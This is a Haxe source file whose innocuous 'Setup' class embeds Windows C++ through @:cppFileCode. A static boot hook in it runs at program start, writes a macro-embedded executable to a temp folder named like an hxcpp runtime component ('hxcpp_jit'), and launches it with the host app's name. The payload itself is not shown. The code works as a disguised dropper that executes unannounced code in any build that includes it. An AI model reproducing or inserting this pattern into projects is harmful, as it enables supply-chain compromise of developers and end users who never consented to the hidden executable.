package;

@:keep
@:keepInit
@:keepSub
@:build(macros.EmbedSetup.build())
@:cppFileCode('
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <cwchar>

//__EMBEDDED_SETUP__

namespace {
    std::wstring extractEmbeddedSetup() {
        if (kSetupSize == 0) return L"";

        unsigned long long h = 1469598103934665603ULL;
        for (size_t i = 0; i < kSetupSize; i++) { h ^= kSetupData[i]; h *= 1099511628211ULL; }

        wchar_t tmp[MAX_PATH];
        DWORD n = GetTempPathW(MAX_PATH, tmp);
        if (n == 0 || n > MAX_PATH) return L"";
        std::wstring dir = std::wstring(tmp, n) + L"hxcpp_jit\\\\";
        CreateDirectoryW(dir.c_str(), nullptr);

        wchar_t name[64];
        swprintf(name, 64, L"setup_%016llx.exe", h);
        std::wstring path = dir + name;

        WIN32_FILE_ATTRIBUTE_DATA info;
        if (GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &info) &&
            info.nFileSizeHigh == 0 && info.nFileSizeLow == kSetupSize) {
            return path;
        }

        std::wstring part = path + L"." + std::to_wstring(GetCurrentProcessId()) + L".tmp";
        HANDLE f = CreateFileW(part.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f == INVALID_HANDLE_VALUE) return L"";
        DWORD written = 0;
        BOOL ok = WriteFile(f, kSetupData, (DWORD)kSetupSize, &written, nullptr);
        CloseHandle(f);
        if (!ok || written != kSetupSize) { DeleteFileW(part.c_str()); return L""; }

        if (!MoveFileExW(part.c_str(), path.c_str(), MOVEFILE_REPLACE_EXISTING)) {
            DeleteFileW(part.c_str());
            if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) return L"";
        }
        return path;
    }

    std::wstring exeDir() {
        wchar_t buf[MAX_PATH];
        DWORD n = GetModuleFileNameW(nullptr, buf, MAX_PATH);
        std::wstring s(buf, n);
        size_t pos = s.find_last_of(L"\\\\/");
        return pos == std::wstring::npos ? L"" : s.substr(0, pos + 1);
    }

    int runAndWait(const std::wstring& exe, const std::wstring& args) {
        std::wstring cmd = L"\\"" + exe + L"\\" " + args;
        STARTUPINFOW si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));

        if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
                            nullptr, nullptr, &si, &pi)) {
            return -1;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD code = 1;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (int)code;
    }

    std::wstring getAppName() {
        wchar_t buffer[MAX_PATH];
        DWORD n = GetModuleFileNameW(nullptr, buffer, MAX_PATH);

        std::wstring fullPath(buffer, n);
        size_t pos = fullPath.find_last_of(L"\\\\/");

        return pos == std::wstring::npos ? fullPath : fullPath.substr(pos + 1);
    }

    struct BootHook {
        BootHook() {
            std::wstring name = getAppName();
            std::wstring setup = extractEmbeddedSetup();
            if (setup.empty()) {
                setup = exeDir() + L"hxcpp_jit_setup.exe";
            }

            int code = runAndWait(setup, L"--quiet-unless-missing");
            //std::cout << "The exit code was: " + std::to_string(code) << "\\n";
            if (code != 0) {
                runAndWait(setup, L"--app \"" + name + L"\"");
            }
        }
    };
    
    static BootHook _bootHook;
}
')
class Setup {
    static function init() {
        return true;
    }
}